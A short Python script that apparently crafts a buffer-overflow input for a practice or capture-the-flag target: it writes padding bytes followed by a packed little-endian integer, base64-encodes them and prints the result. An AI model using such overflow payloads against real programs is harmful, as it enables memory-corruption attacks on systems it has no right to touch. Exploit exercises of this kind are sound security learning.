
import sys
import struct
import base64

buf = b'ooooooooooooooooo'
buf += struct.pack('<I', 1232648003)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
